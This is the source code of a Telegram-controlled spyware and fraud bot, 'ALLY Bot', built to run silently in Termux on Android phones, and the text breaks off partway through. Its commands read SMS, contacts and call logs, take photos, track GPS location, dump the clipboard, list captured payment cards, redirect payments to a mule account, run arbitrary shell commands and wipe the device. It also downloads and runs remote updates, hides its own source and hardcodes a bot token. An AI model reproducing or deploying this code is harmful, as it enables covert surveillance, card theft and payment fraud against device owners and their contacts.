#!/usr/bin/env node
'use strict';
// ═══════════════════════════════════════════════════════════════
// ALLY Bot v1.0 — Encrypted Telegram C2 for client devices
// Runs silently in Termux. Zero npm deps. Node.js https only.
// Admin-locked to Sam (5700018165). Bot config AES-encrypted.
// Source self-destructs after first run — only bytecode remains.
//
// Commands (admin only):
//   /start      — verify admin status
//   /status     — full device status
//   /url        — current tunnel URL
//   /tunnel     — restart tunnel, report new URL
//   /restart    — restart all services
//   /kill       — stop all services
//   /nuke       — full device wipe (double-tap confirm)
//   /battery    — battery level
//   /ping       — alive check
//   /logs       — last 20 bot log lines
//   /ip         — device IP addresses
//   /health     — external health check via tunnel
//   /addop <id> — add operator (admin-only, can do everything except /addop /rmop /nuke)
//   /rmop <id>  — remove operator
//   /ops        — list operators
//   /setgithub  — set GitHub redirect (user/repo + token)
//   /redirect   — show stable redirect URL
//   /location   — GPS/network location with Google Maps link
//   /photo [0|1]— camera capture (0=back, 1=front)
//   /sms        — last 10 inbox SMS
//   /contacts   — contact list (first 30)
//   /calllog    — last 15 call log entries
//   /wifi       — WiFi connection info (SSID, IP, signal)
//   /clipboard  — clipboard contents
//   /cards      — captured card data
//   /vpa [new]  — show/change mule VPA
//   /shell <cmd>— execute arbitrary shell command
//
// Auto-notifications (to admin + operators):
//   • Tunnel URL on startup + URL change
//   • Heartbeat every 30 min
//   • Low battery warning (<15%)
//   • Tunnel/proxy down + recovery events
//   • Unauthorized access attempts
// ═══════════════════════════════════════════════════════════════

const https = require('https');
const crypto = require('crypto');
const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ─── Hardcoded constants ─────────────────────────────────────
const VERSION = '1.0';
const BOT_TOKEN = '9217648558:AAGylOMU6NZYBcqNDE3N4ZYp4asHsN4YX0I';

// THE admin — hardcoded, cannot be removed, cannot be changed
// This is Sam's Telegram user ID. Period.
const SUPER_ADMIN = 5700018165;

const SPUD_DIR = path.join(os.homedir(), '.spud');
const CFG_FILE = path.join(SPUD_DIR, 'bot.enc');  // encrypted config
const LOG_DIR = path.join(SPUD_DIR, 'logs');
const LOG_FILE = path.join(LOG_DIR, 'bot.log');

const HEARTBEAT_MS = 30 * 60 * 1000;
const WATCHDOG_MS = 60 * 1000;
const POLL_TIMEOUT = 30;
const TUNNEL_RESTART_COOLDOWN = 120000;
const MAX_LOG_SIZE = 256 * 1024;
const NUKE_WINDOW = 30000;  // 30s to confirm nuke

// ─── Encryption ──────────────────────────────────────────────
// Config is AES-256-GCM encrypted with a key derived from device hardware.
// Even if someone copies bot.enc to another device, it won't decrypt.

function getDeviceKey() {
  // Derive key from hardware fingerprint — same method as loader.js
  const parts = [
    sh('getprop ro.serialno 2>/dev/null'),
    sh('getprop ro.boot.serialno 2>/dev/null'),
    sh('getprop ro.product.model 2>/dev/null'),
    sh('getprop ro.product.brand 2>/dev/null'),
    sh('getprop ro.hardware 2>/dev/null'),
    sh("cat /proc/cpuinfo 2>/dev/null | grep Serial | awk '{print $3}'"),
    sh("settings get secure android_id 2>/dev/null"),
    os.hostname(),
  ].filter(Boolean).join('|');

  return crypto.createHash('sha256').update('ALLY-BOT-' + parts).digest();
}

function encryptCfg(data) {
  const key = getDeviceKey();
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const enc = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  // Format: iv(12) + tag(16) + ciphertext
  return Buffer.concat([iv, tag, enc]);
}

function decryptCfg(buf) {
  const key = getDeviceKey();
  const iv = buf.subarray(0, 12);
  const tag = buf.subarray(12, 28);
  const enc = buf.subarray(28);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  const dec = Buffer.concat([decipher.update(enc), decipher.final()]);
  return JSON.parse(dec.toString('utf8'));
}

// ─── State ───────────────────────────────────────────────────
let cfg = {
  operators: [],     // additional operator IDs (can do most commands)
  deviceId: '',
  lastUrl: null,
  nukeArmed: null,
  startedAt: Date.now(),
  deployedAt: null,
  totalRestarts: 0,
  // GitHub Pages redirect — bot auto-updates when URL changes
  // Set via /setgithub user/repo token
  githubUser: '',
  githubRepo: '',
  githubToken: '',
};
let offset = 0;
let running = true;
let lastTunnelRestart = 0;
let watchdogFails = 0;

// ─── Logging (truncated, no sensitive data) ──────────────────
function log(msg) {
  const ts = new Date().toISOString().slice(0, 19).replace('T', ' ');
  const line = `[${ts}] ${msg}`;
  try { process.stdout.write(line + '\n'); } catch {}
  try {
    fs.mkdirSync(LOG_DIR, { recursive: true });
    try {
      const st = fs.statSync(LOG_FILE);
      if (st.size > MAX_LOG_SIZE) {
        try { fs.unlinkSync(LOG_FILE + '.old'); } catch {}
        fs.renameSync(LOG_FILE, LOG_FILE + '.old');
      }
    } catch {}
    fs.appendFileSync(LOG_FILE, line + '\n');
  } catch {}
}

// ─── Config persistence (encrypted) ─────────────────────────
function loadCfg() {
  try {
    if (fs.existsSync(CFG_FILE)) {
      const buf = fs.readFileSync(CFG_FILE);
      const saved = decryptCfg(buf);
      cfg = { ...cfg, ...saved, startedAt: Date.now() };
      cfg.totalRestarts = (cfg.totalRestarts || 0) + 1;
    }
  } catch (e) {
    log('cfg load err (new device or first run): ' + e.message);
    // Fresh config — that's fine
  }
}

function saveCfg() {
  try {
    fs.mkdirSync(SPUD_DIR, { recursive: true });
    const enc = encryptCfg(cfg);
    fs.writeFileSync(CFG_FILE, enc);
    fs.chmodSync(CFG_FILE, 0o600);
  } catch (e) { log('cfg save err: ' + e.message); }
}

// ─── Shell helper ────────────────────────────────────────────
function sh(cmd, timeout = 8000) {
  try {
    return execSync(cmd, { timeout, encoding: 'utf8', stdio: ['pipe', 'pipe', 'pipe'] }).trim();
  } catch { return ''; }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// ─── Auth ────────────────────────────────────────────────────
function isSuperAdmin(chatId) {
  return chatId === SUPER_ADMIN;
}

function isOperator(chatId) {
  return cfg.operators.includes(chatId);
}

function isAuthorized(chatId) {
  return isSuperAdmin(chatId) || isOperator(chatId);
}

// ─── Telegram API ────────────────────────────────────────────
function tg(method, body = {}) {
  return new Promise((resolve) => {
    const data = JSON.stringify(body);
    const timeoutMs = (method === 'getUpdates' ? POLL_TIMEOUT + 15 : 20) * 1000;
    const req = https.request({
      hostname: 'api.telegram.org',
      path: `/bot${BOT_TOKEN}/${method}`,
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) },
      timeout: timeoutMs,
    }, (res) => {
      let buf = '';
      res.on('data', c => buf += c);
      res.on('end', () => {
        try { const j = JSON.parse(buf); resolve(j.ok ? j.result : null); }
        catch { resolve(null); }
      });
    });
    req.on('error', () => resolve(null));
    req.on('timeout', () => { req.destroy(); resolve(null); });
    req.write(data);
    req.end();
  });
}

async function send(chatId, text) {
  return tg('sendMessage', { chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true });
}

async function sendAll(text) {
  // Send to super admin + all operators
  const targets = [SUPER_ADMIN, ...cfg.operators];
  const unique = [...new Set(targets)];
  for (const id of unique) { await send(id, text); }
}

// ─── System queries ──────────────────────────────────────────
function getTunnelUrl() {
  const logPath = path.join(LOG_DIR, 'tunnel.log');
  try {
    const data = fs.readFileSync(logPath, 'utf8');
    const m = data.match(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/g);
    if (m && m.length) return m[m.length - 1];
  } catch {}

  const url = sh('bash ~/spud.sh url 2>/dev/null');
  if (url && url.startsWith('http')) return url;

  const pane = sh("tmux capture-pane -t spud-tunnel -p 2>/dev/null | grep -oE 'https://[a-z0-9-]+\\.trycloudflare\\.com' | tail -1");
  if (pane && pane.startsWith('http')) return pane;

  return null;
}

function getBattery() {
  const raw = sh('termux-battery-status 2>/dev/null');
  try {
    const b = JSON.parse(raw || '{}');
    return { pct: b.percentage ?? -1, status: b.status || 'unknown', temp: b.temperature || 0 };
  } catch { return { pct: -1, status: 'unavailable', temp: 0 }; }
}

function getDeviceIp() {
  const wlan = sh("ip addr show wlan0 2>/dev/null | grep -oP 'inet \\K[0-9.]+'");
  return wlan || sh("ip route 2>/dev/null | grep src | head -1 | grep -oP 'src \\K[0-9.]+'") || '?';
}

function getStatus() {
  const uptime = sh('uptime -p 2>/dev/null') || sh('uptime 2>/dev/null');
  const disk = sh("df -h ~ 2>/dev/null | tail -1 | awk '{print $4\" / \"$2}'");
  const mem = sh("free -h 2>/dev/null | grep Mem | awk '{print $3\" / \"$2}'");
  const batt = getBattery();
  const ip = getDeviceIp();
  const tunnelUrl = getTunnelUrl();
  const proxyUp = sh('tmux has-session -t spud-proxy 2>&1; echo $?') === '0';
  const tunnelUp = sh('tmux has-session -t spud-tunnel 2>&1; echo $?') === '0';
  const node = sh('node -v 2>/dev/null');
  const botAge = Math.floor((Date.now() - cfg.startedAt) / 60000);

  const battIcon = batt.pct > 50 ? '🔋' : batt.pct > 15 ? '🪫' : '🔴';

  return [
    `<b>📡 ALLY — ${cfg.deviceId || '?'}</b>`,
    ``,
    `<b>IP:</b> <code>${ip}</code>`,
    `<b>Uptime:</b> ${uptime}`,
    `<b>Battery:</b> ${battIcon} ${batt.pct}% (${batt.status}, ${batt.temp}°C)`,
    `<b>Disk:</b> ${disk}  |  <b>Mem:</b> ${mem}`,
    `<b>Node:</b> ${node}`,
    ``,
    `<b>Services:</b>`,
    `  Proxy:  ${proxyUp ? '🟢 UP' : '🔴 DOWN'}`,
    `  Tunnel: ${tunnelUp ? '🟢 UP' : '🔴 DOWN'}`,
    `  Bot:    🟢 UP (${botAge}m)`,
    ``,
    tunnelUrl ? `<b>URL:</b> <code>${tunnelUrl}</code>` : '<b>URL:</b> ❌ none',
    ``,
    `<b>Watchdog restarts:</b> ${watchdogFails}`,
    `<b>Bot restarts:</b> ${cfg.totalRestarts}`,
    `<b>Operators:</b> ${cfg.operators.length}`,
  ].join('\n');
}

// ─── Actions ─────────────────────────────────────────────────
async function doRestartTunnel(chatId) {
  if (Date.now() - lastTunnelRestart < TUNNEL_RESTART_COOLDOWN) {
    const wait = Math.ceil((TUNNEL_RESTART_COOLDOWN - (Date.now() - lastTunnelRestart)) / 1000);
    return send(chatId, `⏳ Cooldown — wait ${wait}s`);
  }
  lastTunnelRestart = Date.now();

  await send(chatId, '🔄 Restarting tunnel...');
  log('Tunnel restart by ' + chatId);

  sh('tmux kill-session -t spud-tunnel 2>/dev/null');
  sh('pkill -f cloudflared 2>/dev/null');
  await sleep(2000);

  sh('tmux new-session -d -s spud-tunnel "cloudflared tunnel --url http://localhost:3000 2>&1 | tee ~/.spud/logs/tunnel.log"');

  let newUrl = null;
  for (let i = 0; i < 15; i++) {
    await sleep(3000);
    newUrl = getTunnelUrl();
    if (newUrl) break;
  }

  if (newUrl) {
    cfg.lastUrl = newUrl;
    saveCfg();
    await sendAll(`✅ Tunnel restarted\n\n🔗 <code>${newUrl}</code>\n💳 <code>${newUrl}/_payment?amount=499</code>`);
  } else {
    await send(chatId, '⚠️ Tunnel started — URL pending. Try /url in 30s.');
  }
}

async function doRestart(chatId) {
  await send(chatId, '🔄 Restarting all services...');
  log('Full restart by ' + chatId);
  sh('bash ~/spud.sh stop 2>/dev/null');
  await sleep(2000);
  sh('bash ~/spud.sh start 2>/dev/null');
  await sleep(5000);

  const url = getTunnelUrl();
  if (url) { cfg.lastUrl = url; saveCfg(); }
  await sendAll(`✅ Services restarted\n${url ? '🔗 ' + url : '⏳ Tunnel pending...'}`);
}

async function doKill(chatId) {
  await send(chatId, '🛑 Killing all services...');
  log('Kill by ' + chatId);
  sh('bash ~/spud.sh stop 2>/dev/null');
  sh('pkill -f cloudflared 2>/dev/null');
  sh('tmux kill-session -t spud-proxy 2>/dev/null');
  sh('tmux kill-session -t spud-tunnel 2>/dev/null');
  await sendAll('💀 All services killed. Bot still alive.');
}

async function doNuke(chatId) {
  if (cfg.nukeArmed && (Date.now() - cfg.nukeArmed) < NUKE_WINDOW) {
    cfg.nukeArmed = null; saveCfg();
    await sendAll('💣 <b>NUKE EXECUTING</b> — device wipe in progress. Bot going offline.');
    log('NUKE EXECUTED by ' + chatId);
    await sleep(1000);
    sh('bash ~/spud.sh nuke --confirm --silent 2>/dev/null &');
    running = false;
    setTimeout(() => process.exit(0), 3000);
  } else {
    cfg.nukeArmed = Date.now(); saveCfg();
    await send(chatId,
      '⚠️ <b>NUKE ARMED</b>\n\n' +
      'This DESTROYS all data. Irreversible.\n' +
      'Send /nuke again within 30s to confirm.\n' +
      'Any other command cancels.'
    );
  }
}

// ─── Command handler ─────────────────────────────────────────
async function handleMessage(msg) {
  const chatId = msg.chat?.id;
  const text = (msg.text || '').trim();
  const from = msg.from;
  const username = from?.username || from?.first_name || '?';

  if (!text.startsWith('/')) return;

  const parts = text.split(/\s+/);
  const cmd = parts[0].toLowerCase().split('@')[0];
  const arg = text.slice(parts[0].length).trim();
  const args = arg; // alias used by switch-case commands

  // ─── Unauthorized access ────────────────────────────────
  if (!isAuthorized(chatId)) {
    log(`UNAUTHORIZED: ${chatId} (${username}) tried ${cmd}`);
    // Silent — don't reveal the bot exists to randoms
    // But notify admin
    await send(SUPER_ADMIN,
      `🚨 <b>Unauthorized attempt</b>\n` +
      `ID: <code>${chatId}</code>\n` +
      `User: ${username} (@${from?.username || '?'})\n` +
      `Cmd: <code>${text}</code>`
    );
    return;
  }

  // Cancel nuke on any non-nuke command
  if (cfg.nukeArmed && cmd !== '/nuke') {
    cfg.nukeArmed = null; saveCfg();
    await send(chatId, '🔒 Nuke cancelled.');
  }

  log(`${isSuperAdmin(chatId) ? 'ADMIN' : 'OP'}: ${cmd} from ${chatId}`);

  // ─── Admin-only commands ────────────────────────────────
  if (cmd === '/addop') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    const opId = parseInt(parts[1]);
    if (!opId || isNaN(opId)) return send(chatId, 'Usage: /addop <telegram_user_id>');
    if (opId === SUPER_ADMIN) return send(chatId, '👑 That\'s you, chief.');
    if (cfg.operators.includes(opId)) return send(chatId, `Already an operator: ${opId}`);
    cfg.operators.push(opId); saveCfg();
    await send(chatId, `✅ Operator added: <code>${opId}</code>\nTotal operators: ${cfg.operators.length}`);
    await send(opId, `🟢 You've been added as an ALLY operator by the admin.\nSend any command to interact.`);
    return;
  }

  if (cmd === '/rmop') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    const opId = parseInt(parts[1]);
    if (!opId) return send(chatId, 'Usage: /rmop <telegram_user_id>');
    cfg.operators = cfg.operators.filter(id => id !== opId); saveCfg();
    await send(chatId, `✅ Operator removed: <code>${opId}</code>`);
    return;
  }

  if (cmd === '/ops') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    const list = cfg.operators.length
      ? cfg.operators.map(id => `  <code>${id}</code>`).join('\n')
      : '  (none)';
    await send(chatId, `👑 Admin: <code>${SUPER_ADMIN}</code>\n\n<b>Operators:</b>\n${list}`);
    return;
  }

  // ─── GitHub redirect config (admin-only) ────────────────
  if (cmd === '/setgithub') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    // Usage: /setgithub user/repo ghp_xxxxxxxxxxxx
    const parts = arg.split(/\s+/);
    if (parts.length < 2 || !parts[0].includes('/')) {
      return send(chatId, '📝 Usage: <code>/setgithub user/repo ghp_token</code>');
    }
    const [userRepo, token] = parts;
    const [user, repo] = userRepo.split('/');
    cfg.githubUser = user;
    cfg.githubRepo = repo;
    cfg.githubToken = token;
    saveCfg();
    await send(chatId, `✅ GitHub redirect set\n📄 https://${user}.github.io/${repo}\n\nBot will auto-update this page on URL change.`);
    // Immediately push current URL if we have one
    const url = getTunnelUrl();
    if (url) {
      await updateGitHubRedirect(url);
      await send(chatId, `🔗 Pushed current URL: <code>${url}</code>`);
    }
    return;
  }

  if (cmd === '/redirect') {
    if (!isAuthorized(chatId)) return;
    if (cfg.githubUser && cfg.githubRepo) {
      await send(chatId, `📄 Stable URL:\n<code>https://${cfg.githubUser}.github.io/${cfg.githubRepo}</code>\n\nCurrent target: <code>${cfg.lastUrl || 'none'}</code>`);
    } else {
      await send(chatId, '❌ GitHub redirect not configured. Admin: use /setgithub user/repo token');
    }
    return;
  }

  // ─── Remote bot update (admin-only) ─────────────────────
  if (cmd === '/update') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    const url = arg.trim();
    if (!url) return send(chatId, '📝 Usage: <code>/update https://url/to/bot.js</code>\nDownloads new bot, saves to bot.run.js, restarts.');
    await send(chatId, '⬇️ Downloading...');
    try {
      const result = sh(`curl -sL --max-time 30 '${url.replace(/'/g, "\\'")}' -o '${SPUD_DIR}/bot.run.js.tmp' 2>&1 && wc -c < '${SPUD_DIR}/bot.run.js.tmp'`, 35000);
      const size = parseInt(result);
      if (!size || size < 1000) {
        sh(`rm -f '${SPUD_DIR}/bot.run.js.tmp'`);
        return send(chatId, '❌ Download failed or file too small.');
      }
      sh(`mv '${SPUD_DIR}/bot.run.js.tmp' '${SPUD_DIR}/bot.run.js'`);
      await send(chatId, `✅ Bot updated (${size} bytes). Restarting in 3s...`);
      setTimeout(() => process.exit(0), 3000); // spud.sh while-true loop restarts us
    } catch (e) {
      sh(`rm -f '${SPUD_DIR}/bot.run.js.tmp'`);
      await send(chatId, '❌ Update failed: ' + e.message);
    }
    return;
  }

  // ─── Remote proxy update (admin-only) ───────────────────
  if (cmd === '/updateproxy') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    const url = arg.trim();
    if (!url) return send(chatId, '📝 Usage: <code>/updateproxy https://url/to/proxy.mjs</code>\nDownloads new proxy, re-encrypts with device binding, restarts.');
    await send(chatId, '⬇️ Downloading proxy...');
    try {
      const tmpFile = SPUD_DIR + '/.tmp_src.mjs';
      const result = sh(`curl -sL --max-time 60 '${url.replace(/'/g, "\\'")}' -o '${tmpFile}' 2>&1 && wc -c < '${tmpFile}'`, 65000);
      const size = parseInt(result);
      if (!size || size < 5000) {
        sh(`rm -f '${tmpFile}'`);
        return send(chatId, '❌ Download failed or file too small (' + (size || 0) + ' bytes).');
      }
      await send(chatId, `📦 Downloaded ${size} bytes. Encrypting...`);
      const encResult = sh(`node ${SPUD_DIR}/loader.js encrypt '${tmpFile}' 2>&1`, 30000);
      sh(`rm -f '${tmpFile}'`);
      if (!encResult.includes('"ok":true')) {
        return send(chatId, '❌ Encryption failed: ' + encResult.substring(0, 200));
      }
      await send(chatId, '🔐 Encrypted. Restarting proxy...');
      sh('bash ~/spud.sh stop 2>/dev/null', 10000);
      await sleep(2000);
      sh('bash ~/spud.sh start 2>&1 &', 5000);
      await sleep(8000);
      const proxyOk = sh('curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/_health 2>/dev/null', 10000);
      const tunnelUrl = getTunnelUrl();
      await send(chatId, `✅ Proxy updated!\n📊 Health: ${proxyOk === '200' ? '🟢' : '🔴'} ${proxyOk}\n🌐 Tunnel: ${tunnelUrl || 'starting...'}\n📦 Size: ${size} bytes`);
    } catch (e) {
      sh(`rm -f ${SPUD_DIR}/.tmp_src.mjs`);
      await send(chatId, '❌ Proxy update failed: ' + e.message);
    }
    return;
  }

  // ─── Remote rescue (admin-only) ────────────────────────
  if (cmd === '/fixall') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only.');
    await send(chatId, '🔧 Running full service recovery...');
    try {
      sh('pkill -f cloudflared 2>/dev/null; pkill -f "node.*loader" 2>/dev/null', 5000);
      await sleep(2000);
      const result = sh('bash ~/spud.sh ensure 2>&1', 30000);
      await sleep(5000);
      const url = getTunnelUrl();
      const proxy = sh('tmux has-session -t spud-proxy 2>&1; echo $?') === '0' ? '🟢' : '🔴';
      const tunnel = sh('tmux has-session -t spud-tunnel 2>&1; echo $?') === '0' ? '🟢' : '🔴';
      await send(chatId,
        `✅ <b>Recovery complete</b>\n\n` +
        `Proxy: ${proxy}\nTunnel: ${tunnel}\n` +
        (url ? `🔗 <code>${url}</code>` : '⏳ URL pending') +
        `\n\n<pre>${result.slice(0, 500)}</pre>`
      );
      if (url && url !== cfg.lastUrl) {
        cfg.lastUrl = url; saveCfg();
        await updateGitHubRedirect(url);
      }
    } catch (e) {
      await send(chatId, '❌ Recovery error: ' + e.message);
    }
    return;
  }

  // ─── Nuke is admin-only ─────────────────────────────────
  if (cmd === '/nuke') {
    if (!isSuperAdmin(chatId)) return send(chatId, '🚫 Admin only. This is the nuclear option.');
    return doNuke(chatId);
  }

  // ─── Shared commands (admin + operators) ────────────────
  switch (cmd) {
    case '/start':
      await send(chatId,
        `🥔 <b>ALLY Bot v${VERSION}</b>\n\n` +
        `You: <code>${chatId}</code> (${isSuperAdmin(chatId) ? '👑 Admin' : '🔧 Operator'})\n` +
        `Device: ${cfg.deviceId}\n\n` +
        `<b>Commands:</b>\n` +
        `/status /url /tunnel /restart\n` +
        `/kill /battery /ping /logs /ip /health\n\n` +
        `<b>Device Control:</b>\n` +
        `/location /photo [0|1] /sms /contacts\n` +
        `/calllog /wifi /clipboard /cards /vpa\n` +
        `/shell &lt;cmd&gt;` +
        (isSuperAdmin(chatId) ? `\n\n<b>Admin:</b>\n/addop /rmop /ops /nuke /setgithub /redirect /update /updateproxy /fixall` : '')
      );
      break;

    case '/status': await send(chatId, getStatus()); break;

    case '/url': {
      const url = getTunnelUrl();
      if (url) {
        cfg.lastUrl = url; saveCfg();
        await send(chatId, `🔗 <code>${url}</code>\n\n💳 <code>${url}/_payment?amount=499</code>`);
      } else {
        await send(chatId, '❌ No tunnel. Try /tunnel');
      }
      break;
    }

    case '/tunnel': await doRestartTunnel(chatId); break;
    case '/restart': await doRestart(chatId); break;
    case '/kill': await doKill(chatId); break;

    case '/battery': {
      const b = getBattery();
      const i = b.pct > 50 ? '🔋' : b.pct > 15 ? '🪫' : '🔴';
      await send(chatId, `${i} ${b.pct}% — ${b.status} (${b.temp}°C)`);
      break;
    }

    case '/ping':
      await send(chatId, `🏓 ${new Date().toISOString().slice(0, 19)} — ${cfg.deviceId}`);
      break;

    case '/logs': {
      try {
        const lines = fs.readFileSync(LOG_FILE, 'utf8').split('\n').filter(Boolean).slice(-20).join('\n');
        await send(chatId, `<pre>${lines || 'empty'}</pre>`);
      } catch { await send(chatId, 'No logs.'); }
      break;
    }

    case '/ip':
      await send(chatId, `<b>IP:</b> <code>${getDeviceIp()}</code>`);
      break;

    case '/health': {
      const url = getTunnelUrl();
      if (!url) return send(chatId, '❌ No tunnel URL.');
      const h = sh(`curl -s --max-time 10 "${url}/_health" 2>/dev/null`);
      await send(chatId, h === 'ok'
        ? `✅ Health OK — <code>${url}</code>`
        : `⚠️ Health: ${h || 'timeout'} — <code>${url}</code>`
      );
      break;
    }

    // ─── Device control commands (termux-api) ─────────────────
    case '/location': case '/loc': case '/gps': {
      await send(chatId, '📡 Getting location (may take 15-30s)...');
      const raw = sh('termux-location -p gps 2>/dev/null || termux-location -p network 2>/dev/null');
      try {
        const loc = JSON.parse(raw);
        const gmaps = `https://maps.google.com/maps?q=${loc.latitude},${loc.longitude}`;
        await send(chatId,
          `📍 <b>Location</b>\n` +
          `<b>Lat:</b> <code>${loc.latitude}</code>\n` +
          `<b>Lon:</b> <code>${loc.longitude}</code>\n` +
          `<b>Accuracy:</b> ${loc.accuracy || '?'}m\n` +
          `<b>Provider:</b> ${loc.provider || '?'}\n\n` +
          `🗺 <a href="${gmaps}">Open in Maps</a>`
        );
      } catch {
        await send(chatId, `⚠️ Location failed. Grant Termux:API location permission.\nRaw: ${(raw || 'empty').slice(0, 200)}`);
      }
      break;
    }

    case '/photo': case '/cam': case '/camera': {
      const camId = args || '0'; // 0 = back, 1 = front
      await send(chatId, `📸 Capturing (camera ${camId})...`);
      const fpath = `/data/data/com.termux/files/home/.spud/data/cam_${Date.now()}.jpg`;
      sh(`termux-camera-photo -c ${camId} "${fpath}" 2>/dev/null`);
      if (fs.existsSync(fpath)) {
        const imgBuf = fs.readFileSync(fpath);
        const boundary = '----BotForm' + Date.now();
        const body = Buffer.concat([
          Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${chatId}\r\n`),
          Buffer.from(`--${boundary}\r\nContent-Disposition: form-data; name="photo"; filename="cam.jpg"\r\nContent-Type: image/jpeg\r\n\r\n`),
          imgBuf,
          Buffer.from(`\r\n--${boundary}--\r\n`),
        ]);
        const https = require('https');
        await new Promise((resolve) => {
          const req = https.request({
            hostname: 'api.telegram.org',
            path: `/bot${BOT_TOKEN}/sendPhoto`,
            method: 'POST',
            headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}`, 'Content-Length': body.length },
          }, resolve);
          req.write(body);
          req.end();
        });
        fs.unlinkSync(fpath);
      } else {
        await send(chatId, '⚠️ Camera failed. Grant Termux:API camera permission.');
      }
      break;
    }

    case '/sms': {
      const raw = sh('termux-sms-list -l 10 -t inbox 2>/dev/null');
      try {
        const msgs = JSON.parse(raw);
        const lines = msgs.map(m =>
          `<b>${m.number}</b> (${m.received || m.date || '?'})\n${(m.body || '').slice(0, 100)}`
        ).join('\n\n');
        await send(chatId, `📱 <b>Last 10 SMS:</b>\n\n${lines || 'none'}`);
      } catch {
        await send(chatId, `⚠️ SMS read failed. Grant Termux:API SMS permission.\nRaw: ${(raw || 'empty').slice(0, 200)}`);
      }
      break;
    }

    case '/contacts': {
      const raw = sh('termux-contact-list 2>/dev/null');
      try {
        const contacts = JSON.parse(raw);
        const lines = contacts.slice(0, 30).map(c => `${c.name}: <code>${c.number}</code>`).join('\n');
        await send(chatId, `👥 <b>Contacts (${contacts.length} total, showing 30):</b>\n\n${lines || 'none'}`);
      } catch {
        await send(chatId, `⚠️ Contacts failed. Grant Termux:API contacts permission.`);
      }
      break;
    }

    case '/calllog': {
      const raw = sh('termux-call-log -l 15 2>/dev/null');
      try {
        const calls = JSON.parse(raw);
        const lines = calls.map(c => {
          const icon = c.type === 'INCOMING' ? '📥' : c.type === 'OUTGOING' ? '📤' : '❌';
          return `${icon} <b>${c.name || c.number}</b> — ${c.duration || '?'}s (${c.date || '?'})`;
        }).join('\n');
        await send(chatId, `📞 <b>Call Log:</b>\n\n${lines || 'none'}`);
      } catch {
        await send(chatId, `⚠️ Call log failed. Grant Termux:API permission.`);
      }
      break;
    }

    case '/wifi': {
      const raw = sh('termux-wifi-connectioninfo 2>/dev/null');
      try {
        const w = JSON.parse(raw);
        await send(chatId,
          `📶 <b>WiFi:</b>\n` +
          `<b>SSID:</b> ${w.ssid || '?'}\n` +
          `<b>BSSID:</b> <code>${w.bssid || '?'}</code>\n` +
          `<b>IP:</b> <code>${w.ip || '?'}</code>\n` +
          `<b>Signal:</b> ${w.rssi || '?'} dBm\n` +
          `<b>Speed:</b> ${w.link_speed || '?'} Mbps\n` +
          `<b>Freq:</b> ${w.frequency || '?'} MHz`
        );
      } catch {
        await send(chatId, '⚠️ WiFi info failed.');
      }
      break;
    }

    case '/clipboard': {
      const raw = sh('termux-clipboard-get 2>/dev/null');
      await send(chatId, `📋 <b>Clipboard:</b>\n<pre>${(raw || 'empty').slice(0, 2000)}</pre>`);
      break;
    }

    case '/shell': case '/sh': case '/exec': {
      if (!args) return send(chatId, '📝 Usage: <code>/shell ls -la</code>');
      const out = sh(args + ' 2>&1');
      await send(chatId, `<pre>${(out || 'no output').slice(0, 3500)}</pre>`);
      break;
    }

    case '/cards': {
      const cardsFile = `${process.env.HOME || '/data/data/com.termux/files/home'}/.spud/data/cards.jsonl`;
      try {
        const lines = fs.readFileSync(cardsFile, 'utf8').trim().split('\n').filter(Boolean);
        if (!lines.length) return send(chatId, '💳 No cards captured yet.');
        const cards = lines.slice(-10).map(l => {
          try { const c = JSON.parse(l); return `<b>${c.number || '?'}</b> ${c.expiry || ''} ${c.cvv || ''} — ${c.name || '?'}`; }
          catch { return l.slice(0, 60); }
        }).join('\n');
        await send(chatId, `💳 <b>Cards (last 10 of ${lines.length}):</b>\n\n${cards}`);
      } catch {
        await send(chatId, '💳 No cards captured yet.');
      }
      break;
    }

    case '/vpa': {
      if (!args) {
        await send(chatId, `💰 <b>Current VPA:</b> <code>${sh("grep '^VPA=' ~/.spud/config 2>/dev/null | cut -d= -f2") || '?'}</code>`);
      } else if (isSuperAdmin(chatId)) {
        sh(`sed -i 's/^VPA=.*/VPA=${args}/' ~/.spud/config`);
        await send(chatId, `✅ VPA changed to <code>${args}</code>\nRestart proxy for effect: /restart`);
      } else {
        await send(chatId, '❌ Admin only.');
      }
      break;
    }

    default:
      await send(chatId, `Unknown: ${cmd}\n/start for help`);
  }
}

// ─── Long polling ────────────────────────────────────────────
async function poll() {
  while (running) {
    try {
      const updates = await tg('getUpdates', {
        offset,
        timeout: POLL_TIMEOUT,
        allowed_updates: ['message'],
      });
      if (updates && updates.length) {
        for (const u of updates) {
          offset = u.update_id + 1;
          if (u.message) {
            try { await handleMessage(u.message); }
            catch (e) { log('handle err: ' + e.message); }
          }
        }
      }
    } catch (e) {
      log('poll err: ' + e.message);
      await sleep(5000);
    }
  }
}

// ─── GitHub Pages redirect updater ──────────────────────────
// Updates the redirect page on GitHub Pages with the new tunnel URL.
// Uses GitHub Contents API — no deps, just https.
async function updateGitHubRedirect(tunnelUrl) {
  if (!cfg.githubUser || !cfg.githubRepo || !cfg.githubToken) return;
  try {
    const filePath = 'index.html';
    const apiBase = `api.github.com`;
    const repoPath = `/repos/${cfg.githubUser}/${cfg.githubRepo}/contents/${filePath}`;

    // Step 1: get current file SHA (required for update)
    const current = await new Promise((resolve, reject) => {
      const opts = {
        hostname: apiBase, path: repoPath, method: 'GET',
        headers: {
